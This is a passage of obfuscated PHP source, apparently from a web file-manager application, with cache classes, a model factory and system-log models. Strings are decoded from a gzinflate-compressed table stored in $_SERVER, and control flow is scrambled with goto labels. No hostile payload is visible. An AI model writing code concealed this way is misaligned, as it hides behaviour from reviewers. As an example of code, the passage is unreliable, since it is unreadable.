$bÎœãË„Ó÷) { Model($dŠ®èÄ»Š…[760])->remove($bÎœãË„Ó÷[$dŠ®èÄ»Š…[369]], !1); } } private function storeIds() { $BƒŠğ±…Ë =& $_SERVER[¬ˆÚÂ”Éğä]; $e°˜±äÓ² = Model($BƒŠğ±…Ë[711])->listData(); $d× óÕìĞà = array(); $BÅÀƒ¯•¨ = $GLOBALS[$BƒŠğ±…Ë[6]][$BƒŠğ±…Ë[84]][$BƒŠğ±…Ë[761]]; foreach ($e°˜±äÓ² as $fğïÏ•») { $F‘çŒ‰‰‘– = strtolower($fğïÏ•»[$BƒŠğ±…Ë[90]]); if (!isset($BÅÀƒ¯•¨[$F‘çŒ‰‰‘–])) { continue; } $DÖªª¡Ãâ• = $BƒŠğ±…Ë[71] . (isset($BÅÀƒ¯•¨[$F‘çŒ‰‰‘–]) ? $BÅÀƒ¯•¨[$F‘çŒ‰‰‘–] : ucfirst($F‘çŒ‰‰‘–)); if (!class_exists($DÖªª¡Ãâ•)) { continue; } $d× óÕìĞà[] = $fğïÏ•»[$BƒŠğ±…Ë[367]]; } return $d× óÕìĞà; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto BÒÓ“¯Ë•; bóè´¸¸Ã: switch ($CÛöŸæŒÓ[$AìÍ‚ÒÃ™Š[762]]) { case $AìÍ‚ÒÃ™Š[17]: self::$handle = Model($AìÍ‚ÒÃ™Š[764]); break; case $AìÍ‚ÒÃ™Š[765]: self::$handle = new CacheRedis($a®ğ™Ê·«†, $bˆÂÂ°Êò); break; case $AìÍ‚ÒÃ™Š[766]: self::$handle = new CacheMemcached($a®ğ™Ê·«†, $bˆÂÂ°Êò); break; case $AìÍ‚ÒÃ™Š[167]: self::$handle = new CacheFile($a®ğ™Ê·«†, $bˆÂÂ°Êò); break; default: break; } return self::$handle; goto B†³©ôÛ£Ş; DÜæ¨÷ï™: $CÛöŸæŒÓ = $GLOBALS[$AìÍ‚ÒÃ™Š[6]][$AìÍ‚ÒÃ™Š[337]]; $a®ğ™Ê·«† = $CÛöŸæŒÓ[$CÛöŸæŒÓ[$AìÍ‚ÒÃ™Š[762]]]; $bˆÂÂ°Êò = $CÛöŸæŒÓ[$AìÍ‚ÒÃ™Š[763]]; goto bóè´¸¸Ã; BÒÓ“¯Ë•: $AìÍ‚ÒÃ™Š =& $_SERVER[¬ˆÚÂ”Éğä]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto DÜæ¨÷ï™; B†³©ôÛ£Ş: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($d©˜øåÈÅ—) { if (is_array($d©˜øåÈÅ—) || is_object($d©˜øåÈÅ—)) { $d©˜øåÈÅ— = json_encode($d©˜øåÈÅ—); } $d©˜øåÈÅ— = rawurlencode($d©˜øåÈÅ—); return md5(KOD_SITE_ID . $_SERVER[¬ˆÚÂ”Éğä][70] . $d©˜øåÈÅ—); } public static function get($eÃ÷ëÖŒ÷Æ) { $a­…Õ¢è¢ = self::key($eÃ÷ëÖŒ÷Æ); if (!isset(self::$memoryCache[$a­…Õ¢è¢])) { $DƒÊ®÷¹Î = self::init()->get($a­…Õ¢è¢); self::$memoryCache[$a­…Õ¢è¢] = unserialize($DƒÊ®÷¹Î); } return self::$memoryCache[$a­…Õ¢è¢]; } public static function set($a’…áï¢ˆá, $aô×ÂÈ¼áå, $Dƒ¤­œô = false) { goto bÌë‚¥µ§­; FĞÃ¹±·: CacheLock::unlock($a’…áï¢ˆá); return $e¬¸×‚ìã‹; goto E™“®›è¬; bÌë‚¥µ§­: $bªŒèŒ– = self::key($a’…áï¢ˆá); if (isset(self::$memoryCache[$bªŒèŒ–]) && self::$memoryCache[$bªŒèŒ–] === $aô×ÂÈ¼áå) { return !0; } if ($Dƒ¤­œô === 0) { self::$memoryCache[$bªŒèŒ–] = $aô×ÂÈ¼áå; return !0; } goto bÏ¦Ÿø«³¬; bÏ¦Ÿø«³¬: CacheLock::lock($a’…áï¢ˆá); $e¬¸×‚ìã‹ = self::init()->set($bªŒèŒ–, serialize($aô×ÂÈ¼áå), $Dƒ¤­œô); self::$memoryCache[$bªŒèŒ–] = $aô×ÂÈ¼áå; goto FĞÃ¹±·; E™“®›è¬: } public static function remove($dŠÀ°êÖë‡) { goto BÒ¦›Äœô; B½ä÷à´Ì¼: CacheLock::lock($dŠÀ°êÖë‡); $EŠËîŞ·©¹ = self::init()->remove($c  ©ˆô¬Ö); CacheLock::unlock($dŠÀ°êÖë‡); goto bôËÛñ´ğ; bôËÛñ´ğ: return $EŠËîŞ·©¹; goto Eõá©äÜù; BÒ¦›Äœô: $c  ©ˆô¬Ö = self::key($dŠÀ°êÖë‡); unset(self::$memoryCache[$c  ©ˆô¬Ö]); self::clearTimeout(); goto B½ä÷à´Ì¼; Eõá©äÜù: } public static function clearMemory($bæ±½Ü‹ÈÍ = false) { if ($bæ±½Ü‹ÈÍ) { $bæ±½Ü‹ÈÍ = self::key($bæ±½Ü‹ÈÍ); unset(self::$memoryCache[$bæ±½Ü‹ÈÍ]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[¬ˆÚÂ”Éğä][767])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[¬ˆÚÂ”Éğä][768])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($c¸É‰Î‘†, $fÂŒ¢î™”) { $Aˆàäšˆ‡ö =& $_SERVER[¬ˆÚÂ”Éğä]; $this->cachePath = $c¸É‰Î‘†[$Aˆàäšˆ‡ö[75]]; $this->prefix = $Aˆàäšˆ‡ö[769]; $this->cacheTime = $fÂŒ¢î™”; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($Fæ á˜Ã‘–) { $E‘†‰Ú´ÆÊ =& $_SERVER[¬ˆÚÂ”Éğä]; $Fæ á˜Ã‘– = str_replace(array($E‘†‰Ú´ÆÊ[770], $E‘†‰Ú´ÆÊ[93], $E‘†‰Ú´ÆÊ[69]), $E‘†‰Ú´ÆÊ[771], $Fæ á˜Ã‘–); return $this->cachePath . $E‘†‰Ú´ÆÊ[772] . $Fæ á˜Ã‘– . $E‘†‰Ú´ÆÊ[773]; } public function set($Fªö™ï¿ªÏ, $aİ×ùèÉŞ‡, $c­áƒ½º = false) { $bµ•¥ÀÄáÄ = $this->getFile($Fªö™ï¿ªÏ); if (file_put_contents($bµ•¥ÀÄáÄ, $this->prefix . $aİ×ùèÉŞ‡, LOCK_EX)) { return !0; } @unlink($bµ•¥ÀÄáÄ); return !1; } public function get($f„ŠÊ‹ö¤) { $c‹Ä·é¸‰ô = $this->getFile($f„ŠÊ‹ö¤); if (file_exists($c‹Ä·é¸‰ô) && filemtime($c‹Ä·é¸‰ô) < time() - $this->cacheTime) { @unlink($c‹Ä·é¸‰ô); return !1; } $EÄºñšêÚ¶ = @file_get_contents($c‹Ä·é¸‰ô); return substr($EÄºñšêÚ¶, strlen($this->prefix)); } public function remove($dÃï¹ŠŠÇé) { $eÆ‘åñùò = $this->getFile($dÃï¹ŠŠÇé); return @unlink($eÆ‘åñùò); } public function deleteAll() { $C’ÈÁÛÖÇ =& $_SERVER[¬ˆÚÂ”Éğä]; $bë¤¥’êó = scandir($this->cachePath); foreach ($bë¤¥’êó as $a–ì½¢Ç½®) { $f½¦È¹Ê÷¼ = $this->cachePath . $a–ì½¢Ç½®; if (strpos($f½¦È¹Ê÷¼, $C’ÈÁÛÖÇ[773]) && strpos($f½¦È¹Ê÷¼, $C’ÈÁÛÖÇ[774])) { @unlink($f½¦È¹Ê÷¼); } } } public function clearTimeout() { $d˜Éê¬•òï =& $_SERVER[¬ˆÚÂ”Éğä]; $b—ˆì–™‚Œ = scandir($this->cachePath); foreach ($b—ˆì–™‚Œ as $FğŠ—åÃÊñ) { $DĞŞ¿‡ğ = $this->cachePath . $FğŠ—åÃÊñ; if (strpos($DĞŞ¿‡ğ, $d˜Éê¬•òï[773]) && strpos($DĞŞ¿‡ğ, $d˜Éê¬•òï[774]) && filemtime($DĞŞ¿‡ğ) < time() - $this->cacheTime) { @unlink($DĞŞ¿‡ğ); } } } } goto FµæøÈ·–; fá¹‚Úâ÷‹: define($_SERVER[¬ˆÚÂ”Éğä][0], $_SERVER[¬ˆÚÂ”Éğä][1]); $_SERVER[í] = explode($_SERVER[¬ˆÚÂ”Éğä][2], gzinflate(substr($_SERVER[¬ˆÚÂ”Éğä][3], 10, -8))); function Model($DÛËæ÷Ó‘‡ = '', $fŠÒ‡º“ñš = '', $b£Ê“ÂÌÕ— = '') { goto D‘—…¬Ûà»; dÑ†ŞÈÎº: $B¢×—¸ÖÓ×[$BÃáŠé©ãÓ] = new ModelBase($DÛËæ÷Ó‘‡, $fŠÒ‡º“ñš, $b£Ê“ÂÌÕ—); return $B¢×—¸ÖÓ×[$BÃáŠé©ãÓ]; goto F°˜ñßÊˆ; D‘—…¬Ûà»: $EËÈÕ´¶± =& $_SERVER[í]; static $B¢×—¸ÖÓ× = array(); $BÃáŠé©ãÓ = strtolower($fŠÒ‡º“ñš . $EËÈÕ´¶±[0] . $DÛËæ÷Ó‘‡); goto Bë šÓ; Bë šÓ: if (isset($B¢×—¸ÖÓ×[$BÃáŠé©ãÓ])) { return $B¢×—¸ÖÓ×[$BÃáŠé©ãÓ]; } if ($DÛËæ÷Ó‘‡) { $DÛËæ÷Ó‘‡ = strtoupper($DÛËæ÷Ó‘‡[0]) . substr($DÛËæ÷Ó‘‡, 1); $Eöƒ„ÅÉ¸ê = $DÛËæ÷Ó‘‡ . $EËÈÕ´¶±[1]; if (class_exists($Eöƒ„ÅÉ¸ê)) { $B¢×—¸ÖÓ×[$BÃáŠé©ãÓ] = new $Eöƒ„ÅÉ¸ê(); return $B¢×—¸ÖÓ×[$BÃáŠé©ãÓ]; } } if (!$b£Ê“ÂÌÕ—) { $b£Ê“ÂÌÕ— = $GLOBALS[$EËÈÕ´¶±[2]][$EËÈÕ´¶±[3]]; } goto dÑ†ŞÈÎº; F°˜ñßÊˆ: } goto a¾ÃÌ÷°Œ; aµÆÎî‹–: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\145\155\56\114\x69\147\150\164\x41\160\x70"; public $modelType = "\123\171\x73\164\145\155\117\x70\164\151\157\x6e"; public $field = array("\156\141\x6d\145", "\x67\162\x6f\x75\160", "\144\x65\163\x63", "\x63\x6f\156\164\145\156\x74"); public function listData($E¿¥ÇòÚ³á = false, $dÒ§î›ùœ = "\x6d\157\144\x69\146\x79\124\151\155\145", $EÎ¶œÃ»â³ = true) { return parent::listData($E¿¥ÇòÚ³á, $dÒ§î›ùœ, $EÎ¶œÃ»â³); } public function remove($BÚÒ‹¤”Í¶) { $eîŒ„øÎõ = $this->findByName($BÚÒ‹¤”Í¶); if (!$eîŒ„øÎõ) { return !1; } return parent::remove($eîŒ„øÎõ[$_SERVER[¬ˆÚÂ”Éğä][367]]); } public function add($a®µÑó¡áÈ) { if ($this->findByName($a®µÑó¡áÈ[$_SERVER[¬ˆÚÂ”Éğä][28]])) { return !1; } return parent::insert($a®µÑó¡áÈ); } public function update($eİ¤ÂÒ›‡, $B‚¿ÕñÔ‹Ï) { $e£ùŞ¹ºÈÔ =& $_SERVER[¬ˆÚÂ”Éğä]; $Bˆ†ôÈ¨Á‚ = $this->findByName($eİ¤ÂÒ›‡); $DŠ¤±¿®˜ = $this->findByName($B‚¿ÕñÔ‹Ï[$e£ùŞ¹ºÈÔ[28]]); if (!$Bˆ†ôÈ¨Á‚ || $DŠ¤±¿®˜ && $DŠ¤±¿®˜[$e£ùŞ¹ºÈÔ[367]] != $Bˆ†ôÈ¨Á‚[$e£ùŞ¹ºÈÔ[367]]) { return !1; } return parent::update($Bˆ†ôÈ¨Á‚[$e£ùŞ¹ºÈÔ[367]], $B‚¿ÕñÔ‹Ï); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\171\x73\164\x65\155\x5f\154\x6f\x67"; protected $dataAuto = array(array("\143\162\x65\x61\x74\x65\x54\x69\x6d\x65", "\164\151\x6d\145", "\x69\156\163\145\162\164", "\x66\x75\x6e\x63\164\151\x6f\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->allTypeList(); } public function allTypeList() { $a¶ïòÕîÔ’ =& $_SERVER[¬ˆÚÂ”Éğä]; return array($a¶ïòÕîÔ’[2427] => LNG($a¶ïòÕîÔ’[2428]), $a¶ïòÕîÔ’[2429] => LNG($a¶ïòÕîÔ’[2430]), $a¶ïòÕîÔ’[2060] => LNG($a¶ïòÕîÔ’[2431]), $a¶ïòÕîÔ’[2432] => LNG($a¶ïòÕîÔ’[2433]), $a¶ïòÕîÔ’[2434] => LNG($a¶ïòÕîÔ’[2435]), $a¶ïòÕîÔ’[2436] => LNG($a¶ïòÕîÔ’[2437]), $a¶ïòÕîÔ’[2438] => LNG($a¶ïòÕîÔ’[2439]), $a¶ïòÕîÔ’[2440] => LNG($a¶ïòÕîÔ’[2441]), $a¶ïòÕîÔ’[2091] => LNG($a¶ïòÕîÔ’[2442]), $a¶ïòÕîÔ’[2092] => LNG($a¶ïòÕîÔ’[2443]), $a¶ïòÕîÔ’[2444] => LNG($a¶ïòÕîÔ’[2445]), $a¶ïòÕîÔ’[2446] => LNG($a¶ïòÕîÔ’[2447]), $a¶ïòÕîÔ’[2448] => LNG($a¶ïòÕîÔ’[2449]), $a¶ïòÕîÔ’[2450] => LNG($a¶ïòÕîÔ’[2451]), $a¶ïòÕîÔ’[2089] => LNG($a¶ïòÕîÔ’[2452]), $a¶ïòÕîÔ’[2096] => LNG($a¶ïòÕîÔ’[2453]), $a¶ïòÕîÔ’[2454] => LNG($a¶ïòÕîÔ’[2455]), $a¶ïòÕîÔ’[2456] => LNG($a¶ïòÕîÔ’[2457]), $a¶ïòÕîÔ’[2458] => LNG($a¶ïòÕîÔ’[2459]), $a¶ïòÕîÔ’[2460] => LNG($a¶ïòÕîÔ’[2461]), $a¶ïòÕîÔ’[2099] => LNG($a¶ïòÕîÔ’[2462]), $a¶ïòÕîÔ’[2100] => LNG($a¶ïòÕîÔ’[2463]), $a¶ïòÕîÔ’[2464] => LNG($a¶ïòÕîÔ’[2465]), $a¶ïòÕîÔ’[2466] => LNG($a¶ïòÕîÔ’[2467]), $a¶ïòÕîÔ’[2468] => LNG($a¶ïòÕîÔ’[2469]), $a¶ïòÕîÔ’[2094] => LNG($a¶ïòÕîÔ’[2470]), $a¶ïòÕîÔ’[2471] => LNG($a¶ïòÕîÔ’[2472]), $a¶ïòÕîÔ’[2093] => LNG($a¶ïòÕîÔ’[2473]), $a¶ïòÕîÔ’[2474] => LNG($a¶ïòÕîÔ’[2475]), $a¶ïòÕîÔ’[2476] => LNG($a¶ïòÕîÔ’[2477]), $a¶ïòÕîÔ’[2478] => LNG($a¶ïòÕîÔ’[2478]), $a¶ïòÕîÔ’[2479] => LNG($a¶ïòÕîÔ’[2064]), $a¶ïòÕîÔ’[2480] => LNG($a¶ïòÕîÔ’[2481]), $a¶ïòÕîÔ’[2482] => LNG($a¶ïòÕîÔ’[2483]), $a¶ïòÕîÔ’[2484] => LNG($a¶ïòÕîÔ’[2485]), $a¶ïòÕîÔ’[2486] => LNG($a¶ïòÕîÔ’[2487]), $a¶ïòÕîÔ’[2488] => LNG($a¶ïòÕîÔ’[2489]), $a¶ïòÕîÔ’[2490] => LNG($a¶ïòÕîÔ’[2490]), $a¶ïòÕîÔ’[2491] => LNG($a¶ïòÕîÔ’[2492]), $a¶ïòÕîÔ’[2493] => LNG($a¶ïòÕîÔ’[2494]), $a¶ïòÕîÔ’[2495] => LNG($a¶ïòÕîÔ’[2496]), $a¶ïòÕîÔ’[2497] => LNG($a¶ïòÕîÔ’[2498]), $a¶ïòÕîÔ’[2499] => LNG($a¶ïòÕîÔ’[2500]), $a¶ïòÕîÔ’[2501] => LNG($a¶ïòÕîÔ’[2502])); } private function typeFile() { $cƒ“²î =& $_SERVER[¬ˆÚÂ”Éğä]; $e¯“„‘éÕ¤ = array($cƒ“²î[2096] => array($cƒ“²î[2097]), $cƒ“²î[2448] => array($cƒ“²î[2503]), $cƒ“²î[2450] => array($cƒ“²î[2504]), $cƒ“²î[2089] => array($cƒ“²î[2090]), $cƒ“²î[2456] => array(), $cƒ“²î[2458] => array(), $cƒ“²î[2460] => array(), $cƒ“²î[2099] => array($cƒ“²î[2101]), $cƒ“²î[2100] => array($cƒ“²î[2101]), $cƒ“²î[2464] => array($cƒ“²î[2505]), $cƒ“²î[2466] => array($cƒ“²î[2505]), $cƒ“²î[2468] => array($cƒ“²î[2506]), $cƒ“²î[2454] => array($cƒ“²î[2507]), $cƒ“²î[2094] => array($cƒ“²î[2508]), $cƒ“²î[2471] => array($cƒ“²î[2509]), $cƒ“²î[2093] => array($cƒ“²î[2095])); return $e¯“„‘éÕ¤; } private function typeAll() { goto B¬ĞÈİÉùÁ; aÊ„º¡’Œº: foreach ($c«ÏÛ†²™Ì as $Añ¼ĞôÉ‚½ => $fÕŸğ®ÂÌ™) { $d¦¥£Ñ´ò÷[$fÕŸğ®ÂÌ™[0]] = $d¦¥£Ñ´ò÷[$Añ¼ĞôÉ‚½]; } $d¦¥£Ñ´ò÷[$cÏø«ˆæòŸ[2101]] = LNG($cÏø«ˆæòŸ[2510]); $d¦¥£Ñ´ò÷[$cÏø«ˆæòŸ[2505]] = LNG($cÏø«ˆæòŸ[2511]); goto d…òáÊøŒğ; d…òáÊøŒğ: return $d¦¥£Ñ´ò÷; goto BøÅŸ˜îÁ©; B¬ĞÈİÉùÁ: $cÏø«ˆæòŸ =& $_SERVER[¬ˆÚÂ”Éğä]; $d¦¥£Ñ´ò÷ = $this->typeList; $c«ÏÛ†²™Ì = array_filter($this->typeFile()); goto aÊ„º¡’Œº; BøÅŸ˜îÁ©: } public function addLog($eåéÂ­, $eİ„øãåŠ = array()) { goto B‡â–¥çãˆ; fï’Åìğ—á: $eİ„øãåŠ = array($DÍˆ‚˜ä‡‘[1440] => Session::sign(), $DÍˆ‚˜ä‡‘[1441] => $F„¬ ¦¸ä, $DÍˆ‚˜ä‡‘[29] => $eåéÂ­, $DÍˆ‚˜ä‡‘[1443] => json_encode($eİ„øãåŠ)); parent::add($eİ„øãåŠ); goto A¶¶ÄÒ‡Â½; BÈƒÉ¶½‘: if (!$F„¬ ¦¸ä) { $F„¬ ¦¸ä = (int) Session::get($DÍˆ‚˜ä‡‘[2242]); } $eÅ›Õ˜¶ = get_client_ip(); if (!$eİ„øãåŠ || strlen(json_encode($eİ„øãåŠ)) >= 1024) { $eİ„øãåŠ = array($DÍˆ‚˜ä‡‘[2512] => $eÅ›Õ˜¶); } else { if (is_array($eİ„øãåŠ)) { $eİ„øãåŠ[$DÍˆ‚˜ä‡‘[2512]] = $eÅ›Õ˜¶; } else { $eİ„øãåŠ = array($DÍˆ‚˜ä‡‘[1047] => $eİ„øãåŠ, $DÍˆ‚˜ä‡‘[2512] => $eÅ›Õ˜¶); } } goto fï’Åìğ—á; B‡â–¥çãˆ: $DÍˆ‚˜ä‡‘ =& $_SERVER[¬ˆÚÂ”Éğä]; if (!isset($this->typeList[$eåéÂ­])) { return; } $F„¬ ¦¸ä = defined($DÍˆ‚˜ä‡‘[427]) && USER_ID ? USER_ID : (isset($eİ„øãåŠ[$DÍˆ‚˜ä‡‘[1450]]) ? $eİ„øãåŠ[$DÍˆ‚˜ä‡‘[1450]] : 0); goto BÈƒÉ¶½‘; A¶¶ÄÒ‡Â½: } public function remove($e™´äİµ¹´) { $this->where(array($_SERVER[¬ˆÚÂ”Éğä][385] => $e™´äİµ¹´))->delete(); } private function _makeOrder($F¨µ½¯­¡ = '') { goto bŠ¦ÏâÃò; EôŞƒáëÆÓ: $EÃÖ³…ËÚŒ = Input::get($eáŸÓ¦ËÔŠ[408], $eáŸÓ¦ËÔŠ[7], $eáŸÓ¦ËÔŠ[2276], array($eáŸÓ¦ËÔŠ[2201], $eáŸÓ¦ËÔŠ[404])); $EÃÖ³…ËÚŒ = $b­¿Ô¾¶ãŸ[$EÃÖ³…ËÚŒ]; $F¨µ½¯­¡ = $F¨µ½¯­¡ . "{$fµí“İÜéƒ}\40{$EÃÖ³…ËÚŒ}"; goto aŸ‰™å¿‰Æ; aŸ‰™å¿‰Æ: return $this->order($F¨µ½¯­¡); goto dï‚›¬¯§™; bŠ¦ÏâÃò: $eáŸÓ¦ËÔŠ =& $_SERVER[¬ˆÚÂ”Éğä]; $fµí“İÜéƒ = $eáŸÓ¦ËÔŠ[187]; $b­¿Ô¾¶ãŸ = array($eáŸÓ¦ËÔŠ[402] => $eáŸÓ¦ËÔŠ[403], $eáŸÓ¦ËÔŠ[404] => $eáŸÓ¦ËÔŠ[405]); goto EôŞƒáëÆÓ; dï‚›¬¯§™: } public function get($dÊßğëóŒÇ = '') { goto Cø¶‚öôêä; FŒµóÌóà¤: if (!empty($dÊßğëóŒÇ[$c¾†™Ë—ù‰[2512]])) { $FÙ±Ç‘¹²´[$c¾†™Ë—ù‰[405]] = array($c¾†™Ë—ù‰[759], "\45{$dÊßğëóŒÇ[$c¾†™Ë—ù‰[2512]]}\45"); } $dĞšï¡²ñÂ = $this->_makeOrder()->where($FÙ±Ç‘¹²´)->selectPage(); if (empty($dĞšï¡²ñÂ[$c¾†™Ë—ù‰[354]])) { show_json(array(), !0, $dĞšï¡²ñÂ[$c¾†™Ë—ù‰[351]]); } goto F­‹êÖŞˆò; a§Ï‘‚Â”: if ($dÊßğëóŒÇ[$c¾†™Ë—ù‰[1450]]) { $FÙ±Ç‘¹²´[$c¾†™Ë—ù‰[1450]] = $dÊßğëóŒÇ[$c¾†™Ë—ù‰[1450]]; } if (isset($dÊßğëóŒÇ[$c¾†™Ë—ù‰[710]])) { $DòŸ½‘Åèì = $dÊßğëóŒÇ[$c¾†™Ë—ù‰[710]]; $E×Œï ò¿ = isset($dÊßğëóŒÇ[$c¾†™Ë—ù‰[449]]) ? $dÊßğëóŒÇ[$c¾†™Ë—ù‰[449]] : time(); $FÙ±Ç‘¹²´[$c¾†™Ë—ù‰[187]] = array($c¾†™Ë—ù‰[321], array($DòŸ½‘Åèì, $E×Œï ò¿)); } if ($dÊßğëóŒÇ[$c¾†™Ë—ù‰[29]]) { $Dõù†ƒÖ£¤ = explode($c¾†™Ë—ù‰[47], $dÊßğëóŒÇ[$c¾†™Ë—ù‰[29]]); $dâ†øÂÖ›Œ = $this->typeFile(); $b˜šî’£Œ³ = array(); foreach ($Dõù†ƒÖ£¤ as $a¾“Í¾ò§Á) { $b˜šî’£Œ³[] = $a¾“Í¾ò§Á; if (isset($dâ†øÂÖ›Œ[$a¾“Í¾ò§Á])) { $b˜šî’£Œ³ = array_merge($b˜šî’£Œ³, $dâ†øÂÖ›Œ[$a¾“Í¾ò§Á]); } } $b˜šî’£Œ³ = array_unique($b˜šî’£Œ³); if ($b˜šî’£Œ³) { $FÙ±Ç‘¹²´[$c¾†™Ë—ù‰[29]] = array($c¾†™Ë—ù‰[7], $b˜šî’£Œ³); } } goto FŒµóÌóà¤; F­‹êÖŞˆò: $dĞšï¡²ñÂ[$c¾†™Ë—ù‰[354]] = $this->logList($dĞšï¡²ñÂ[$c¾†™Ë—ù‰[354]]); return $dĞšï¡²ñÂ; goto a¨ªš©É‡ß; Cø¶‚öôêä: $c¾†™Ë—ù‰ =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$dÊßğëóŒÇ) { show_json(array()); } $FÙ±Ç‘¹²´ = array(); goto a§Ï‘‚Â”; a¨ªš©É‡ß: } private function ipAddress(&$BƒœƒÕïç†) { $d¶Ëö‰—¢ë =& $_SERVER[¬ˆÚÂ”Éğä]; if (!empty($BƒœƒÕïç†[$d¶Ëö‰—¢ë[2512]])) { $cĞø—…¦åá = IpLocation::get($BƒœƒÕïç†[$d¶Ëö‰—¢ë[2512]]); } else { $cĞø—…¦åá = LNG($d¶Ëö‰—¢ë[2513]); } $BƒœƒÕïç†[$d¶Ëö‰—¢ë[2514]] = $cĞø—…¦åá; } private function descZipDownload($e²Ëƒ‚ãã¢, &$e—ó«¼Ú­Æ) { $DéÌÙ „¦ª =& $_SERVER[¬ˆÚÂ”Éğä]; if (!isset($e²Ëƒ‚ãã¢[$DéÌÙ „¦ª[2515]])) { return; } $d¡ƒÕ¼õ’ = json_decode($e²Ëƒ‚ãã¢[$DéÌÙ „¦ª[2515]], !0); foreach ($d¡ƒÕ¼õ’ as $E¸ÑŒğ£÷ò) { if (!IO::init($E¸ÑŒğ£÷ò[$DéÌÙ „¦ª[75]])) { continue; } if (!($a÷‘ù®Å¢³ = IO::infoFull($E¸ÑŒğ£÷ò[$DéÌÙ „¦ª[75]]))) { continue; } $e²Ëƒ‚ãã¢[$DéÌÙ „¦ª[75]] = $E¸ÑŒğ£÷ò[$DéÌÙ „¦ª[75]]; $e—ó«¼Ú­Æ[] = $e²Ëƒ‚ãã¢[$DéÌÙ „¦ª[369]] = $a÷‘ù®Å¢³[$DéÌÙ „¦ª[369]]; $e—ó«¼Ú­Æ[] = $e²Ëƒ‚ãã¢[$DéÌÙ „¦ª[2331]] = $a÷‘ù®Å¢³[$DéÌÙ „¦ª[463]]; break; } return $e²Ëƒ‚ãã¢; } private function getSourceList(&$Eí˜‡åÓ) { $eƒÀßƒŒœ‹ =& $_SERVER[¬ˆÚÂ”Éğä]; $cáàÉÄ”Œ = array(); foreach ($Eí˜‡åÓ as $eÙÓ§ìÈˆ­ => $a²ç×‹á‡ñ) { goto dˆİ³¡„ù; dˆİ³¡„ù: $e›ˆ«ê¹¬ö = json_decode($a²ç×‹á‡ñ[$eƒÀßƒŒœ‹[405]], !0); if ($a²ç×‹á‡ñ[$eƒÀßƒŒœ‹[29]] == $eƒÀßƒŒœ‹[2092]) { $e›ˆ«ê¹¬ö = $this->descZipDownload($e›ˆ«ê¹¬ö, $cáàÉÄ”Œ); $Eí˜‡åÓ[$eÙÓ§ìÈˆ­][$eƒÀßƒŒœ‹[405]] = json_encode($e›ˆ«ê¹¬ö); continue; } if (strpos($a²ç×‹á‡ñ[$eƒÀßƒŒœ‹[29]], $eƒÀßƒŒœ‹[2332]) !== 0) { goto a›Ÿß³·ò‘; aÎöæëÎó¼: continue; goto f¸…Õ„ŞŸö; dèŸçÃºèÕ: $cáàÉÄ”Œ[] = $e›ˆ«ê¹¬ö[$eƒÀßƒŒœ‹[369]] = $b½é‘Èâñ‡[$eƒÀßƒŒœ‹[369]]; $cáàÉÄ”Œ[] = $e›ˆ«ê¹¬ö[$eƒÀßƒŒœ‹[2331]] = $b½é‘Èâñ‡[$eƒÀßƒŒœ‹[463]]; $Eí˜‡åÓ[$eÙÓ§ìÈˆ­][$eƒÀßƒŒœ‹[405]] = json_encode($e›ˆ«ê¹¬ö); goto aÎöæëÎó¼; a›Ÿß³·ò‘: if (!isset($e›ˆ«ê¹¬ö[$eƒÀßƒŒœ‹[75]]) || strpos($a²ç×‹á‡ñ[$eƒÀßƒŒœ‹[29]], $eƒÀßƒŒœ‹[2516]) !== 0) { continue; } if (!IO::init($e›ˆ«ê¹¬ö[$eƒÀßƒŒœ‹[75]])) { continue; } if (!($b½é‘Èâñ‡ = IO::infoFull($e›ˆ«ê¹¬ö[$eƒÀßƒŒœ‹[75]]))) { continue; } goto dèŸçÃºèÕ; f¸…Õ„ŞŸö: } goto DÎ‘ë©ùì; DÎ‘ë©ùì: $cáàÉÄ”Œ[] = $e›ˆ«ê¹¬ö[$eƒÀßƒŒœ‹[369]]; $cáàÉÄ”Œ[] = $e›ˆ«ê¹¬ö[$eƒÀßƒŒœ‹[2331]]; if ($e›ˆ«ê¹¬ö[$eƒÀßƒŒœ‹[29]] == $eƒÀßƒŒœ‹[494]) { $cáàÉÄ”Œ[] = $e›ˆ«ê¹¬ö[$eƒÀßƒŒœ‹[405]][$eƒÀßƒŒœ‹[1020]]; $cáàÉÄ”Œ[] = $e›ˆ«ê¹¬ö[$eƒÀßƒŒœ‹[405]][$eƒÀßƒŒœ‹[1021]]; } goto eÑİ­ˆ¹ÀŸ; eÑİ­ˆ¹ÀŸ: if ($e›ˆ«ê¹¬ö[$eƒÀßƒŒœ‹[29]] == $eƒÀßƒŒœ‹[2339]) { $cáàÉÄ”Œ[] = $e›ˆ«ê¹¬ö[$eƒÀßƒŒœ‹[405]][$eƒÀßƒŒœ‹[369]]; } goto bË×ƒ¨­Û¸; bË×ƒ¨­Û¸: } if (!$cáàÉÄ”Œ) { return array(); } return Model($eƒÀßƒŒœ‹[760])->sourceListInfo($cáàÉÄ”Œ, !0); } private function logList($aÑˆ‚ìğÆğ) { goto DŠïÇé‹Æå; bö§ºÅö÷: return $Dƒœù…‹Ï•; goto cĞ‡›Üè‘ì; DŠïÇé‹Æå: $F”Ë†¾‰’ñ =& $_SERVER[¬ˆÚÂ”Éğä]; $A»ÅøÍº–ë = array_to_keyvalue($aÑˆ‚ìğÆğ, $F”Ë†¾‰’ñ[33], $F”Ë†¾‰’ñ[1450]); $D¾Ü±ãª¾ª = Model($F”Ë†¾‰’ñ[479])->userListInfo(array_unique($A»ÅøÍº–ë)); goto FóÑ¨í£ó‰; DÊÃèÁÒ»‡: $F·‚ó»©âã = array(); foreach ($aÑˆ‚ìğÆğ as $cã‚ãÁ›„Ú => $bˆëŸ‘ÚÜÔ) { goto aŸ³Ëæ¯ ê; aŒÏæØ»Ú: unset($bˆëŸ‘ÚÜÔ[$F”Ë†¾‰’ñ[2519]]); $Dƒœù…‹Ï•[] = $bˆëŸ‘ÚÜÔ; goto D›¹Ñ Û‡¦; AÅ‚òàˆÀ: 